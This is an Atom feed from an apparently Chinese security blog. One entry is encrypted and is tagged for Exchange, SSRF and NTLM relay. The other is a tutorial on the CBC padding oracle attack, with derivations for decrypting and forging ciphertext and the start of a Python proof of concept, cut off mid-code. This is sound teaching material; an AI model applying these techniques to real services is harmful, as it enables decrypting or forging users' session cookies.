<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>written by hosch3n</subtitle>
  <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://hosch3n.github.io/"/>
  <updated>2021-08-21T04:11:33.186Z</updated>
  <id>https://hosch3n.github.io/</id>
  
  <author>
    <name>hosch3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows凭据窃取（二）[编写中]</title>
    <link href="https://hosch3n.github.io/2021/08/20/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/08/20/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-08-20T12:00:00.000Z</published>
    <updated>2021-08-21T04:11:33.186Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8456e1ac2df68c91517452104674ae96724146335fb45e870da0163622c35a54">41c58eb45cf8d2595182cf24053a0074c59741e7a139e91c827700b7dfdb2e330b5c43f6f547b0295d9023135bc503011d97116afeda0f415ba81f889cca321cc650880ca29d41f35eb5490d54367d5e88175ae599cbc5a41d1a8f0f72d71c474afed764fd8925cf8d73ddb83f4ac319a525141e543e2251beb9bfb8796764be26dfcb3afd2ed36c2711a3db591a4071b765de43f9c2e9c75578216a63646f5feb7811ec88f4b2d5d83209425ddeca9beca6621590d05371ed67bc44bedc33eccd9c461dd8eda88b6375e18e5aa76517e06133a32dafc5780e2dd3197254a4cec412f500a60fc18b85084fbc0efd8a7af37d704e110f8f183b6b463167c31d0aaddf20e5a174770cdd705d80df1151c45399d58164f05ba920fa8a9dac5f5e5816a470fbdfc19c6935d03eae2272ccc59fe254fdb2ca354105e51d2d236de259437b9282ca696ec5deb72a923b54109711c523483142d481152c2a0ba77bdbf4f1d7f960363ccfa12ad4a0e6436984cc8fd85d5e9fb29e47ac73757811e1409ad6960a86da1f66fe3d4803ddf085aaf01a50ff3cefe68b5e2e7bae51f787e68a85cbdaec9d721088b1289f7c25e902652da75beb8536823b9e203e746b9806fdb2cb9586252a70b1b01ed7065be132ecc231a8d74ba17c5af6a3f0f4f2e6f2ea8393a11e49ae1fea6bf079d8bc1e9c2c76fcfa50f43ea2d4e2b8712f5af8246c87e8b27a67570ec52a51275cce37eecc8a44b75f6122554d2cfefac3ad9ab9e6a01a20a170ec738753762d56a33bbcd67c3467465b7c630b534d15b5869972b40b580fcea28e4f6f0df47df91ecbb1da3605911bdf35644952d5a34eeb0302b73139bec546cb03fd8ffa43562908fcc16296471b0f747d105b23941dbfb898180c575e318f2d4dbbd74da79e9f5001c9733b727a56fee8edefee72277eb39db89dc834042713d75ac1aa561460984671cf3b62f422fe4494e1de60644dc6c7973246c9201a6135df9a9a6142fee95e42c699cddde5b9650ebbb4450a13aa573a12b200f8c558e142dc3bcc9030e5ee5b39d97db3719b417d16976d62a41e068fdf24ab28ae7521a848ff8b507be891fccf67b4d4d7071798c87144f5b273b4d90bea310bbddcb754c4af972ca65977daf3785f8346901bf65ed836a1e43f274c0bbc69862a7c77b2ea41ab8bd13a9bbdb1ecb321214a885efad6e0bf65aeef0336acbcec5f6593df0e1dd36174a78b1a878722a4bcd3955fa13509f789c3841bd2bff5bac69b68ca9b896191e7e5b970fa45bf11333b1ef881b8428f0820574f5193c53407944efc73962e839827706f7f914e07404a2d4431c70dc57fd60b9bc9663c73bc306510b7d8e0b1d7e695a33b0060e88d45a0c2699f79bcff876f2ac63c58da569baf1a5578842139853a256c556f0b08d6809e8fe7ffdb2e53c432127dc3313a23077bea50bee30fad60ac9998b0be00010e01300b7c1a26f6381a035e245a9b48bcad618288f0cab2ba7c215bccdce26cb6b02282a82a0282cc069ddf27ccfabbb05e61f1b76e06f509585ec2ca9b20e72c5578ba3ce2484a8a8e9a50d0a1b8302de01ccf081a726709b71f89d0ed5ef38c01a48cdbd4943663237c6d483711ffefdd10ac22a944854a1d97cbc3f102de129a806c28b1eaaee583c9de289e4168711a8758ee72027cc3dadf2008549fabece02ade41e404028cfddd87eefd9f16972c45a4daeb6b8941c4c14c6c45acfe5f2a1111146c084f7ff3fbfc220b20d9d34664356d9de7c10423322c0dfc5ca6c76a2995a0cbb5479f5f6fcf2ae1a16bce8da165a63ed1bd7285467f413d14046ae129119fc0eb7fa7f279d38f0434d3e752a00258bd54586bef8ad0415e11c606e5e77a963d7eaef08fc9050be2a8f40e010e8fb4ed202a0609</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="exchange" scheme="https://hosch3n.github.io/tags/exchange/"/>
    
    <category term="ssrf" scheme="https://hosch3n.github.io/tags/ssrf/"/>
    
    <category term="ntlm" scheme="https://hosch3n.github.io/tags/ntlm/"/>
    
    <category term="relay" scheme="https://hosch3n.github.io/tags/relay/"/>
    
  </entry>
  
  <entry>
    <title>PaddingOracle攻击</title>
    <link href="https://hosch3n.github.io/2021/08/10/PaddingOracle%E6%94%BB%E5%87%BB/"/>
    <id>https://hosch3n.github.io/2021/08/10/PaddingOracle%E6%94%BB%E5%87%BB/</id>
    <published>2021-08-10T14:29:07.000Z</published>
    <updated>2021-08-19T14:57:05.753Z</updated>
    
    <content type="html"><![CDATA[<p>根据加解密时是否用同一组密钥，可以分为对称加密和非对称加密。对称加密中根据对数据处理粒度的不同，可以分为分组加密算法（AES、3DES、DES、Blowfish、RC2、CAST）和流加密算法（ChaCha20、Salsa20、RC4）</p><ul><li>常见的非对称加密算法有RSA、ElGamal、DSA、ECC等</li></ul><p>分组加密算法中根据加解密时对数据的分组编排方式，经典工作模式有ECB、CBC、PCBC、CFB、OFB、CTR等，其中后三者可以将分组加密转化为流加密形式。为了在保证机密性的前提下进一步保证完整性，现代工作模式有CCM（CBC-MAC）、EAX、GCM、SIV（Synthetic Initialization Vector）、OCB（Offset CodeBook）等。</p><h2 id="分组加密方式简介"><a href="#分组加密方式简介" class="headerlink" title="分组加密方式简介"></a>分组加密方式简介</h2><p>分组加密方式只能使用一个固定大小的密钥加密相同字节长度的明文，所以需要将加密的明文按照密钥大小拆分为多块（所以也叫块加密），如果拆分后最后一个块明文长度不够，就需要填充字节来补齐长度。按照常见的PKCS#5或PKCS#7标准，最后需要填充几个字节，那么所填充的字节的值就用几；如果明文最后一个块刚好满足长度大小，那就需要填充完整一个块。</p><p>举个例子，对称密钥为<code>12345678</code>时长度为8，当待加密的明文为<code>abcdefg</code>时其长度为7，填充后的块为<code>[a][b][c][d][e][f][g][0x01]</code>;当待加密的明文为<code>abcdefghabcdef</code>时其长度为14，填充后的块为<code>[a][b][c][d][e][f][g][h][a][b][c][d][e][f][0x02][0x02]</code>；当待加密的明文为<code>abcdefgh</code>时其长度为8，填充后的块为<code>[a][b][c][d][e][f][g][h][0x08][0x08][0x08][0x08][0x08][0x08][0x08][0x08]</code>。</p><h2 id="异或和可逆性"><a href="#异或和可逆性" class="headerlink" title="异或和可逆性"></a>异或和可逆性</h2><p>异或的概念对于二进制位而言，就是两个位不同则得到1，两个位相同则得到0。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ^ <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> ^ <span class="number">0</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> ^ <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> ^ <span class="number">0</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看出异或的结果与参与运算的两个值先后顺序没有关系，按小学的说法可以称为异或交换律。= =</p><p>再看仔细一些可以知道，如果A^B=C，那么A^C=B、B^C=A，说明异或具有可逆性。</p><p>两个十进制的异或就是都转为二进制再逐位异或。两个字节的异或，就是对字节取ASCII码（十进制）再。。。两个长度相同字符串的异或就是逐字节。。。所以字符串的异或本质就是二进制位的异或，这说明异或的可逆性同样适用于字符串。</p><h2 id="CBC工作模式简介"><a href="#CBC工作模式简介" class="headerlink" title="CBC工作模式简介"></a>CBC工作模式简介</h2><p><img src="/img/pdoa_a.png"></p><p>Plaintext指明文块，Ciphertext指密文块，key指对称密钥，<code>⊕</code>符号表示异或。</p><p>IV（Initialization Vector）是每次加密时都应随机生成的一串与分块大小相同的随机值，随机IV的存在使得相同的对称密钥加密两次相同的明文也会得到不同的密文，规避了ECB模式相关安全问题。如果某些具体实现中IV重复使用或是可以预测，亦或是使用全0的IV则会导致明文块泄漏，但这不是本文讨论的重点。</p><p>加密时先将第一块明文与初始IV异或，再将异或后的块用对称密钥加密得到第一块密文。第一块密文会作为第二块的IV，与第二块明文异或后再用对称密钥加密得到第二块密文，直到最后一块密文加密完成。</p><ul><li>从第二块明文开始，每块明文加密都需要用到上一块的密文作为IV，加密过程无法并行</li></ul><p>解密时先将密文用对称密钥解密得到一个中间值，将此中间值与IV异或得到明文。注意我现在没有说第一块了，因为IV此时都是已知的，每两个密文块就可以解出一个明文块，解密过程可以并行。</p><p>因为解密第一块密文时需要初始的IV，而初始IV在密码学中本就没有保密性要求，通常都会将初始IV拼接到密文头部一起发给客户端（至于为什么拼接在头部而不是尾部或是单独分开，因为上一块密文就是下一块密文IV，拼接到头部其实就是让IV作为第零块密文，顺其自然地成为第一块密文的IV）。</p><h2 id="PaddingOracle"><a href="#PaddingOracle" class="headerlink" title="PaddingOracle"></a>PaddingOracle</h2><p>PaddingOracle一般是指对称加密算法CBC工作模式的一种攻击方式。如果能够区分密文解密出错的原因，是由于填充错误（比如填充的<code>[0x01][0x02]</code>），还是由于正常解密出的明文在具体的业务环境中报错（比如判断role是<code>admin</code>还是<code>member</code>，结果解密出来是<code>!@#$</code>），就能在不知道对称密钥的情况下，利用错误回显或是时间延迟的侧信道，爆破和推测出密文被对称密钥解密后的 中间值，进一步可以推测出密文被完整解密后的 原始明文，或是利用中间值结合可控的IV逆推构造出 想要的明文。</p><ul><li>利用错误回显或是时间延迟做判断的这个过程就称为oracle</li></ul><h3 id="推导明文"><a href="#推导明文" class="headerlink" title="推导明文"></a>推导明文</h3><p>下面来分析下具体流程，我们先从多个加密块的第一个块说起，我将密文块被对称密钥解密后的值称为中间值，中间值与IV异或后会得到完整解密的明文块。</p><p>首先需要思考的是，解密时如何判断填充的字节有没有出错呢？答案是从完整解密后的明文块最后一个字节开始读，如果发现最后一个字节是<code>0x03</code>，那么就继续读倒数第二个字节、倒数第三个字节并确认其都是<code>0x03</code>，如果倒数第二或第三个字节不是<code>0x03</code>就说明出现了填充错误。</p><p>那么通过某种手段使明文最后一个字节为<code>0x01</code>时，读完最后一个字节后就不会再向前校验了，所以这个块无论如何都不会出现填充错误。明文最后一个字节是由中间值最后一个字节与IV最后一个字节异或而来，那么就存在以下推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必然存在一个guess_iv[-1]值符合</span></span><br><span class="line">guess_iv[<span class="number">-1</span>] ^ middle[<span class="number">-1</span>] = <span class="number">0x01</span></span><br><span class="line"><span class="comment"># 根据异或可逆性反推出真实中间值middle[-1]</span></span><br><span class="line">middle[<span class="number">-1</span>] = guess_iv[<span class="number">-1</span>] ^ <span class="number">0x01</span></span><br><span class="line"><span class="comment"># 得到真实中间值middle[-1]后，与原本的iv[-1]算出真实的明文plain[-1]</span></span><br><span class="line">plain[<span class="number">-1</span>] = iv[<span class="number">-1</span>] ^ middle[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>虽然但是，那怎么知道这个必然存在的值是什么呢？在IV可控且能区分出有没有填充错误时，我们可以对IV最后一个字节进行爆破，如果不是这个<code>必然存在的值</code>，解密后明文最后一个字节不是<code>0x01</code>就会出现填充错误，没有填充错误时就说明我们爆破到了这个<code>必然存在的值</code>。因为1个字节是8个二进制位，最多只需要爆破2的8次方=256次就可以得到。</p><ul><li>可能有小伙伴会说假如这个块本身就是填充的<code>0x02</code>呢，那解密成<code>0x02</code>和<code>0x01</code>就都不会出现填充错误，注意开头说了我们目前分析的是多个加密块的第一个块，这种情况下第一个块不可能出现填充字节，而正常的明文一般也不会出现<code>0x02</code>，更多细节我们稍后讨论</li></ul><p>知道中间值最后一个字节后，我们就能继续推导构造后两个字节的明文值，进而得到倒数第二个字节的中间值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我们已经知道中间值最后一个字节</span></span><br><span class="line">guess_iv[<span class="number">-1</span>] ^ middle[<span class="number">-1</span>] = <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 可以直接逆推出需要构造的guess_iv[-1]</span></span><br><span class="line">guess_iv[<span class="number">-1</span>] = middle[<span class="number">-1</span>] ^ <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 同样的方法爆破出guess_iv[-2]</span></span><br><span class="line">guess_iv[<span class="number">-2</span>] ^ middle[<span class="number">-2</span>] = <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 进一步推导出中间值middle[-2]</span></span><br><span class="line">middle[<span class="number">-2</span>] = guess[<span class="number">-2</span>] ^ <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 得到真实中间值middle[-2]后，与原本的iv[-2]算出真实的明文plain[-2]</span></span><br><span class="line">plain[<span class="number">-2</span>] = iv[<span class="number">-2</span>] ^ middle[<span class="number">-2</span>]</span><br></pre></td></tr></table></figure><p>重复这个套路，可以一直向前爆破和推导出这个块中间值和明文的每个字节，再对每个块重复这个套路就可以得到每个块中间值和明文的每个字节，与正常解密过程一样可以并行处理。这里清晰后就是时候讨论我们一直刻意忽略的，只有一个块或是最后一个块的填充问题了。</p><p>如果填充值是<code>0x03</code>或更大，由于是从后往前推出<code>[0x01]</code>，<code>[0x02][0x02]</code>，存在多位相互校验就不会出现Oracle时的误判。而不论明文刚好本身倒数第二个字节是<code>0x02</code>还是最后一个块填充后有两个<code>0x02</code>，都有可能出现明文最后一个字节首先爆破成的是<code>0x02</code>（而非<code>0x01</code>），但由于不会出现填充错误，导致我们误以为使用这个guess_iv[-1]实际构造的出的是<code>0x01</code>。</p><p>在群里讨论后，@香依香偎 师傅给出的思路是在最后一个填充字节判断成功的情况下，构造倒数第二字节为任意值都不出现填充错误，就说明倒数第一个字节确实构造成了<code>0x01</code>，也就是上文所说的情况了；而如果构造倒数第二字节时出现了填充错误，就说明我们构造出的明文最后一个字节其实是<code>0x02</code>（妙啊）。同时@Vanish 牛也提醒了，在这种得到错误<code>middle[-1]</code>的情况下，进行后续步骤就会出错。所以这种情况推导<code>middle[-1]</code>用<code>guess_iv[-1] ^ 0x02</code>就行了。</p><h3 id="构造密文"><a href="#构造密文" class="headerlink" title="构造密文"></a>构造密文</h3><p>理解了推导明文的过程，构造密文（也称为CBC翻转）就很简单了。爆破推测出每一个字节的中间值，调整各个IV的各个字节使其与中间值异或后就是我们想要的明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 推导需要构造出的IV</span></span><br><span class="line">middle[i] ^ admin[i] = iv[i]</span><br><span class="line"><span class="comment"># 中间值与构造的IV异或后会得到想要的明文</span></span><br><span class="line">middle[i] ^ iv[i] = admin[i]</span><br></pre></td></tr></table></figure><p>由于第N块密文的IV就是第N-1块密文本身，所以我们需要从后向前先推出最后一块、再倒数第二、第三。。。一直推到第一块并构造出需要的原始IV，其实就是个逆序加密的过程，与正常加密过程一样不能够并行处理。</p><h3 id="没有IV与IV不可控"><a href="#没有IV与IV不可控" class="headerlink" title="没有IV与IV不可控"></a>没有IV与IV不可控</h3><p>设想一种没有IV且IV不可控的情况，服务器端加密<code>xxx: abc; user: member;...</code>原始信息，只将加密后的密文作为Cookie发往浏览器，而将用于加密的初始IV维护在服务器Session中，此时得不到初始IV也就没法套路出第一块密文的明文块了（但中间值还是能推测出来的），后续密文块的IV就是前一个密文块，所以第一块之外的密文还是能解出明文。对于CBC翻转来说，第一块明文的内容就没法构造了，为了配合后续块解密，被我们构造出的第一块密文也会被初始IV异或得不成样子。</p><p>假如此时通过某种途径泄漏出了Session里的初始IV，也就是有初始IV但IV不可控的情况，那么就能完整解密出包括第一块在内的全部明文。CBC翻转情况不变。</p><p>又假如通过某种途径导致Session里的初始IV可控（但读不到原本的初始IV），也就是没有初始IV但IV可控的情况，那么就能完整构造出包括第一块密文在内的全部密文。明文解密情况不变。</p><p>所以能不能读到初始IV影响原本第一块明文的解密，初始IV可不可控影响第一块明文的构造。</p><h3 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h3><p>考古了道哥写的py2demo，用Python3重写了一份，注意的是这份代码中判断填充正确与否是直接用了padding_byte值，所以不会出现上文讨论的<code>0x02</code>导致误判的情况，但实战环境中就需要改写为通过HTTP状态码、错误回显、时间延迟等手段进行判断了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    CBC Padding Oracle Demo</span></span><br><span class="line"><span class="string">    Author: hosch3n</span></span><br><span class="line"><span class="string">    Reference: https://hosch3n.github.io/2021/08/10/PaddingOracle%E6%94%BB%E5%87%BB/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Padding Oracle Attack POC(CBC-MODE)</span></span><br><span class="line"><span class="string">    Author: axis(axis@ph4nt0m.org)</span></span><br><span class="line"><span class="string">    http://hi.baidu.com/aullik5</span></span><br><span class="line"><span class="string">    2011.9</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    This program is based on Juliano Rizzo and Thai Duong&#x27;s talk on </span></span><br><span class="line"><span class="string">    Practical Padding Oracle Attack.(http://netifera.com/research/)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    For Education Purpose Only!!!</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="string">    it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="string">    the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="string">    (at your option) any later version.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="string">    but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="string">    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="string">    GNU General Public License for more details.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="string">    along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, ARC2, Blowfish, CAST, DES, DES3</span><br><span class="line"><span class="comment"># from base64 import b64encode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_pkcs</span>(<span class="params">plaintext, block_size</span>):</span></span><br><span class="line">    <span class="comment"># Calculate Padding Byte</span></span><br><span class="line">    <span class="comment"># The Byte Value is Length</span></span><br><span class="line">    padding_byte = block_size - len(plaintext) % block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make Padding</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(padding_byte):</span><br><span class="line">        plaintext.append(padding_byte)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_encrypt</span>(<span class="params">plaintext, IV, SMKEY, CIPHER</span>):</span></span><br><span class="line">    <span class="comment"># String to ByteArray</span></span><br><span class="line">    plaintext = bytearray(plaintext, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SMKEY Length</span></span><br><span class="line">    key_len = len(SMKEY)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        <span class="comment"># AES SMKEY Length must be 16/24/32</span></span><br><span class="line">        <span class="comment"># AES-128 / AES-192 / AES-256</span></span><br><span class="line">        <span class="keyword">if</span> key_len != <span class="number">16</span> <span class="keyword">and</span> key_len != <span class="number">24</span> <span class="keyword">and</span> key_len != <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cipher_object = AES.new(SMKEY, AES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;ARC2&quot;</span>:</span><br><span class="line">        cipher_object = ARC2.new(SMKEY, ARC2.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;Blowfish&quot;</span>:</span><br><span class="line">        cipher_object = Blowfish.new(SMKEY, Blowfish.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;CAST&quot;</span>:</span><br><span class="line">        cipher_object = CAST.new(SMKEY, CAST.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;DES&quot;</span> <span class="keyword">and</span> key_len == <span class="number">8</span>:</span><br><span class="line">        cipher_object = DES.new(SMKEY, DES.MODE_CBC, 